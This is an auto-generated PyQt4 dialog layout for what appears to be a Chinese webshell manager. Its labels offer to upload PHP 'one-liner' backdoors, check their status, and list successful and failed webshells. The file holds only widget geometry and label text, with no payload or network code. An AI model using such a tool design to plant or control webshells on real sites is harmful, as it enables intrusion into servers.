# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'untitled.ui'
#
# Created: Fri Mar 13 17:01:55 2015
#      by: PyQt4 UI code generator 4.10.1
#
# WARNING! All changes made in this file will be lost!

from PyQt4 import QtCore, QtGui

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s

try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName(_fromUtf8("Dialog"))
        Dialog.resize(1372, 661)
        self.messagebox = QtGui.QTextEdit(Dialog)
        self.messagebox.setGeometry(QtCore.QRect(700, 400, 661, 211))
        self.messagebox.setObjectName(_fromUtf8("messagebox"))
        self.tableView = QtGui.QTableView(Dialog)
        self.tableView.setGeometry(QtCore.QRect(10, 10, 1351, 381))
        self.tableView.setObjectName(_fromUtf8("tableView"))
        self.groupBox_2 = QtGui.QGroupBox(Dialog)
        self.groupBox_2.setGeometry(QtCore.QRect(300, 400, 381, 251))
        self.groupBox_2.setObjectName(_fromUtf8("groupBox_2"))
        self.label = QtGui.QLabel(self.groupBox_2)
        self.label.setGeometry(QtCore.QRect(10, 30, 71, 16))
        self.label.setObjectName(_fromUtf8("label"))
        self.tx_textEdit_1 = QtGui.QTextEdit(self.groupBox_2)
        self.tx_textEdit_1.setGeometry(QtCore.QRect(80, 20, 41, 31))
        self.tx_textEdit_1.setObjectName(_fromUtf8("tx_textEdit_1"))
        self.label_2 = QtGui.QLabel(self.groupBox_2)
        self.label_2.setGeometry(QtCore.QRect(130, 30, 51, 20))
        self.label_2.setObjectName(_fromUtf8("label_2"))
        self.tx_textEdit_2 = QtGui.QTextEdit(self.groupBox_2)
        self.tx_textEdit_2.setGeometry(QtCore.QRect(10, 60, 281, 61))
        self.tx_textEdit_2.setObjectName(_fromUtf8("tx_textEdit_2"))
        self.pb_pushButton_5 = QtGui.QPushButton(self.groupBox_2)
        self.pb_pushButton_5.setGeometry(QtCore.QRect(10, 130, 171, 31))
        self.pb_pushButton_5.setObjectName(_fromUtf8("pb_pushButton_5"))
        self.pb_pushButton_6 = QtGui.QPushButton(self.groupBox_2)
        self.pb_pushButton_6.setGeometry(QtCore.QRect(200, 130, 171, 31))
        self.pb_pushButton_6.setObjectName(_fromUtf8("pb_pushButton_6"))
        self.pb_pushButton_4 = QtGui.QPushButton(self.groupBox_2)
        self.pb_pushButton_4.setGeometry(QtCore.QRect(300, 60, 71, 61))
        self.pb_pushButton_4.setObjectName(_fromUtf8("pb_pushButton_4"))
        self.tx_textEdit_3 = QtGui.QTextEdit(self.groupBox_2)
        self.tx_textEdit_3.setGeometry(QtCore.QRect(260, 20, 101, 31))
        self.tx_textEdit_3.setObjectName(_fromUtf8("tx_textEdit_3"))
        self.tx_textEdit_4 = QtGui.QTextEdit(self.groupBox_2)
        self.tx_textEdit_4.setGeometry(QtCore.QRect(10, 170, 361, 31))
        self.tx_textEdit_4.setObjectName(_fromUtf8("tx_textEdit_4"))
        self.pb_pushButton_8 = QtGui.QPushButton(self.groupBox_2)
        self.pb_pushButton_8.setGeometry(QtCore.QRect(200, 210, 171, 31))
        self.pb_pushButton_8.setObjectName(_fromUtf8("pb_pushButton_8"))
        self.pb_pushButton_7 = QtGui.QPushButton(self.groupBox_2)
        self.pb_pushButton_7.setGeometry(QtCore.QRect(10, 210, 171, 31))
        self.pb_pushButton_7.setObjectName(_fromUtf8("pb_pushButton_7"))
        self.label_4 = QtGui.QLabel(self.groupBox_2)
        self.label_4.setGeometry(QtCore.QRect(210, 30, 51, 20))
        self.label_4.setObjectName(_fromUtf8("label_4"))
        self.label_3 = QtGui.QLabel(Dialog)
        self.label_3.setGeometry(QtCore.QRect(700, 620, 661, 31))
        self.label_3.setObjectName(_fromUtf8("label_3"))
        self.pb_pushButton_3 = QtGui.QPushButton(Dialog)
        self.pb_pushButton_3.setGeometry(QtCore.QRect(60, 600, 211, 41))
        self.pb_pushButton_3.setObjectName(_fromUtf8("pb_pushButton_3"))
        self.pb_pushButton_1 = QtGui.QPushButton(Dialog)
        self.pb_pushButton_1.setGeometry(QtCore.QRect(50, 400, 221, 41))
        self.pb_pushButton_1.setObjectName(_fromUtf8("pb_pushButton_1"))
        self.pb_pushButton_2 = QtGui.QPushButton(Dialog)
        self.pb_pushButton_2.setGeometry(QtCore.QRect(10, 450, 121, 41))
        self.pb_pushButton_2.setObjectName(_fromUtf8("pb_pushButton_2"))
        self.pb_pushButton_9 = QtGui.QPushButton(Dialog)
        self.pb_pushButton_9.setGeometry(QtCore.QRect(10, 550, 121, 41))
        self.pb_pushButton_9.setObjectName(_fromUtf8("pb_pushButton_9"))
        self.pushButton = QtGui.QPushButton(Dialog)
        self.pushButton.setGeometry(QtCore.QRect(150, 450, 131, 41))
        self.pushButton.setObjectName(_fromUtf8("pushButton"))
        self.pushButton_2 = QtGui.QPushButton(Dialog)
        self.pushButton_2.setGeometry(QtCore.QRect(150, 500, 131, 41))
        self.pushButton_2.setObjectName(_fromUtf8("pushButton_2"))
        self.pushButton_3 = QtGui.QPushButton(Dialog)
        self.pushButton_3.setGeometry(QtCore.QRect(150, 550, 131, 41))
        self.pushButton_3.setObjectName(_fromUtf8("pushButton_3"))
        self.pushButton_4 = QtGui.QPushButton(Dialog)
        self.pushButton_4.setGeometry(QtCore.QRect(10, 500, 121, 41))
        self.pushButton_4.setObjectName(_fromUtf8("pushButton_4"))

        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        Dialog.setWindowTitle(_translate("Dialog", "一句话--自动--上传网页文件--自动访问--0.3  目前文件上传只支持PHP  落雪技术支持  QQ:2602159946", None))
        self.groupBox_2.setTitle(_translate("Dialog", "上传/访问", None))
        self.label.setText(_translate("Dialog", "延时/超时:", None))
        self.tx_textEdit_1.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">5</p></body></html>", None))
        self.label_2.setText(_translate("Dialog", "/s(秒)", None))
        self.tx_textEdit_2.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">c:/123.php</p></body></html>", None))
        self.pb_pushButton_5.setText(_translate("Dialog", "上传文件", None))
        self.pb_pushButton_6.setText(_translate("Dialog", "访问URL路径", None))
        self.pb_pushButton_4.setText(_translate("Dialog", "选择文件", None))
        self.tx_textEdit_3.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">123.php</p></body></html>", None))
        self.tx_textEdit_4.setHtml(_translate("Dialog", "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.0//EN\" \"http://www.w3.org/TR/REC-html40/strict.dtd\">\n"
"<html><head><meta name=\"qrichtext\" content=\"1\" /><style type=\"text/css\">\n"
"p, li { white-space: pre-wrap; }\n"
"</style></head><body style=\" font-family:\'SimSun\'; font-size:9pt; font-weight:400; font-style:normal;\">\n"
"<p style=\" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;\">123.php?del=123456</p></body></html>", None))
        self.pb_pushButton_8.setText(_translate("Dialog", "访问URL路径(带参数)", None))
        self.pb_pushButton_7.setText(_translate("Dialog", "设置URL路径(带参数)", None))
        self.label_4.setText(_translate("Dialog", "文件名", None))
        self.label_3.setText(_translate("Dialog", "<html><head/><body><p align=\"center\"><span style=\" font-size:14pt;\">按住CTRL或SHIFT选择要操作的URL和选择文件夹或文件是一样的</span></p><p align=\"center\"><br/></p></body></html>", None))
        self.pb_pushButton_3.setText(_translate("Dialog", "软件说明", None))
        self.pb_pushButton_1.setText(_translate("Dialog", "检测webshell\n"
"一句话状态", None))
        self.pb_pushButton_2.setText(_translate("Dialog", "导入一句话", None))
        self.pb_pushButton_9.setText(_translate("Dialog", "删除数据", None))
        self.pushButton.setText(_translate("Dialog", "显示全部数据", None))
        self.pushButton_2.setText(_translate("Dialog", "显示成功webshell", None))
        self.pushButton_3.setText(_translate("Dialog", "显示失败webshell", None))
        self.pushButton_4.setText(_translate("Dialog", "导出数据", None))

